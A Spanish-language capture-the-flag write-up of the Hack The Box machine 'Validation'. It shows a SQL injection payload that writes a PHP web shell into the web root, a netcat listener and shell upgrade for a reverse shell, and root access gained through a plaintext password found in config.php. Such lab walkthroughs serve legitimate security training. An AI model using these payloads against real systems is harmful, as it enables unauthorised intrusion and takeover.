---
layout: post
title: Maquina Validation
date: 2022-07-8 19:50:20 +0200
description: Máquina Validation de Hack the Box # Add post description (optional)
img: validation.png # Add image post (optional)
fig-caption: # Add figcaption (optional)
tags: [validation, linux, sqli, rce, reverse shell, php]
---

Validation es una maquina linux de nivel fácil en hack the box pero que me pareció muy curiosa por su remote code execution.

*********************************
# Enumeración

Tiramos el Nmap:

![nmap]({{site.baseurl}}/assets/img/Validation/2022-07-11_171337.png)

Vemos varios puertos abiertos, entre ellos el 80 y el 8080 vamos a echar un vistazo.

Vemos una pagina que nos lleva a account.php, parece una especie de inscripción donde podemos meter nuestro nombre y tiene una lista de países.
Ponemos un nombre y va almacenando los nombres que pongamos en el país seleccionado, tiene pinta de ser una base de datos, vamos a ver mas con [burpsuite](https://portswigger.net/burp).

Interceptamos una petición y vemos que esta enviando el nombre que nosotros pongamos junto con el país elegido, también podemos ver que nos da una cookie de user que es el nombre que le hemos metido en md5. Vamos a probar si se acontece una inyección sql.

Probamos poniendo una comilla en nuestro nombre, dejamos correr la petición y nada, no nos da ningún error, el campo user no es inyectable, pero si probamos con el campo país ahí si nos lanza un error, eso significa que el campo es inyectable. [Aquí](https://portswigger.net/web-security/sql-injection) tenemos buena información sobre sqli.

Después de descubrir los nombres de tablas columnas etc.. llegamos a una via muerta, nada util, los nombres de usuario y los userhash son los mismos que nos aparecían en la cookie de usuario, el nombre en md5.

![hashes]({{site.baseurl}}/assets/img/Validation/2022-07-11_183053.png)

*****************************
# Rce mediante Sqli

Podemos probar a ver si tenemos capacidad de incluir ficheros en la máquina, sabemos que la máquina ejecuta php y quizá podamos aprovecharnos de eso. Probamos con un union select:

> username=test&country=Brazil' union select "test" into outfile "/var/www/html/test.txt"-- -

Metemos la palabra test dentro del archivo test.php en la ruta /var/www/html y después de recargar la pagina vemos que funciona.

![Test]({{site.baseurl}}/assets/img/Validation/2022-07-11_184527.png)

Bien¡ podemos meter un archivo en php y poder tener inyección remota de comandos¡.

> username=test&country=Brazil' union select "<?php system($_REQUEST['cmd']) ?>" into outfile "/var/www/html/test.php"-- -

Con esto tendremos el archivo test.php que al ser llamado ejecutara un request al sistema con la variable cmd que nosotros metamos. Probamos con un whoami y vemos que somos www-data, el rce funciona.

![Rce]({{site.baseurl}}/assets/img/Validation/2022-07-11_194440.png)

Solo nos queda ponernos en escucha con netcat en nuestra máquina por el puerto que queramos y lanzar una shell desde la paginas o el burpsuite.

> nc -lnvp 1234

![Reverse]({{site.baseurl}}/assets/img/Validation/2022-07-11_194455.png)

Ya estamos dentro, usaremos python o para tener una consola util y podemos ver la flag de usuario.

>python3 -c "__import__('pty').spawn('/bin/bash')"

Información importante, [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), la biblia del hacking.

# Escalada de privilegios.

ya dentro de la máquina y con una consola real, procedemos a la enumeración.

Podemos usar estos [recursos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md).

Después de echar un vistazo en el propio directorio de www demos que hay una pagina config.php con contraseñas en claro. No puede ser tan fácil, probamos la contraseña como root con su y si¡ es asi de fácil somos root ya podemos ver la flag.

![Root]({{site.baseurl}}/assets/img/Validation/2022-07-11_195548.png)

********************************

Hasta aquí la máquina Validation una máquina con una escalada de privilegios muy sencilla pero una intrusión muy interesante para ver otras formas de sqli. 

!Nos vemos¡.

